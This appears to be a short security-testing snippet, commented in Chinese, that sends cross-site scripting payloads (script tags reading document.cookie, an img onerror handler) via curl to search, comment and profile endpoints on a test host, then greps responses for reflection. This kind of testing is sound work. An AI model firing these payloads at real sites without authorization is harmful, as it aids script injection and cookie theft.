# 测试搜索框 XSS（GET 请求）
curl -G "http://test.example.com/search" \
  --data-urlencode "q=<script>alert(document.cookie)</script>" \
  | grep -i "script"

# 测试评论接口 XSS（POST 请求）
curl -X POST "http://test.example.com/api/comment" \
  -H "Content-Type: application/json" \
  -d '{"content": "<img src=x onerror=alert(1)>", "userId": 1}' \
  | grep -i "onerror"

# 测试 URL 参数 XSS
curl "http://test.example.com/profile?name=<script>alert(1)</script>"
